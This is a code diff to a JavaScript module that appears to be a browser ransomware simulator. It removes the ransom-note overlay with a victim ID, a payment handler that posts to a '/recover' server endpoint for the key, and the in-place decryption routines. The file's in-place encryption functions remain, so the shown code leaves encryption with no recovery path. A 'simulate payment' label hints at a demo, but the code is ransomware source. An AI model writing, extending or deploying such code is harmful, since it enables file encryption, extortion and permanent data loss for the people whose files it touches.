@@ -165,53 +165,6 @@ const startEncryption = async () => {
     }
 };
 
-const showRansomNote = () => {
-    if (!DOM.ransomOverlay || !DOM.victimIdDisplay) return;
-    DOM.victimIdDisplay.textContent = state.clientId;
-    DOM.ransomOverlay.style.display = 'flex';
-};
-
-const handlePayment = async () => {
-    const payBtn = document.getElementById('payRansomBtn');
-    const statusDiv = document.getElementById('paymentStatus');
-    if (!payBtn || !statusDiv) return;
-    
-    payBtn.disabled = true;
-    payBtn.textContent = "Contacting Server...";
-    statusDiv.textContent = "Verifying transaction...";
-
-    try {
-        const res = await fetch(`${API_BASE_URL}/recover`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ clientId: state.clientId })
-        });
-
-        const data = await res.json();
-
-        if (res.ok && data.success) {
-            statusDiv.style.color = '#4ec9b0';
-            statusDiv.textContent = "PAYMENT VERIFIED! Decrypting files...";
-            
-            await decryptAllFiles(data.key);
-            
-            setTimeout(() => {
-                if (DOM.ransomOverlay) DOM.ransomOverlay.style.display = 'none';
-                alert("All files have been restored.");
-                if (DOM.selectDirBtn) DOM.selectDirBtn.disabled = false;
-            }, 1000);
-
-        } else {
-            throw new Error(data.error || "Payment verification failed");
-        }
-    } catch (error) {
-        payBtn.disabled = false;
-        payBtn.textContent = "💸 SIMULATE PAYMENT & DECRYPT";
-        statusDiv.style.color = '#f14c4c';
-        statusDiv.textContent = `Error: ${error.message}`;
-    }
-};
-
 // --- FILE OPERATIONS ---
 const encryptFileInPlace = async (fileHandle, cryptoKey) => {
   try {
@@ -240,54 +193,6 @@ const encryptFileInPlace = async (fileHandle, cryptoKey) => {
   }
 };
 
-const decryptAllFiles = async (autoKey = null) => {
-    if (!state.selectedDirectory) return;
-    
-    const rawKeyBase64 = autoKey || prompt('Enter Decryption Key (Base64):');
-    if (!rawKeyBase64) return;
-
-    if (DOM.progressBar) DOM.progressBar.style.width = '0%';
-
-    try {
-        const files = await FileSystemModule.readAllFiles(state.selectedDirectory);
-        let processed = 0;
-
-        for (const fileHandle of files) {
-            await decryptFileInPlace(fileHandle, rawKeyBase64);
-            processed++;
-            if (DOM.progressBar) {
-              DOM.progressBar.style.width = `${(processed / files.length) * 100}%`;
-            }
-            if (DOM.progressText) {
-              DOM.progressText.textContent = `Recovering: ${processed}/${files.length}`;
-            }
-        }
-    } catch (error) {
-        console.error('Recovery failed:', error.message);
-    }
-};
-
-const decryptFileInPlace = async (fileHandle, rawKeyBase64) => {
-  try {
-    const encryptedBytes = await FileSystemModule.readFileAsUint8Array(fileHandle);
-    
-    // Extract IV (first 12 bytes) and ciphertext (remaining bytes)
-    const iv = encryptedBytes.slice(0, 12);
-    const ciphertext = encryptedBytes.slice(12);
-
-    const decryptedBytes = await CryptoModule.decryptFile(
-      { iv: iv, ciphertext: ciphertext },
-      rawKeyBase64
-    );
-
-    await FileSystemModule.writeBytesToHandle(fileHandle, decryptedBytes);
-    return true;
-  } catch (error) {
-    console.error(`Failed to restore ${fileHandle.name}:`, error.message);
-    return false;
-  }
-};
-
 // --- INIT ---
 export const initApp = async () => {
   DOM = {
@@ -302,7 +207,5 @@ export const initApp = async () => {
   };
 
   if (DOM.selectDirBtn) DOM.selectDirBtn.addEventListener('click', handleDirectorySelection);
-  if (DOM.payRansomBtn) DOM.payRansomBtn.addEventListener('click', handlePayment);
-
   await initializeIdentity();
 };
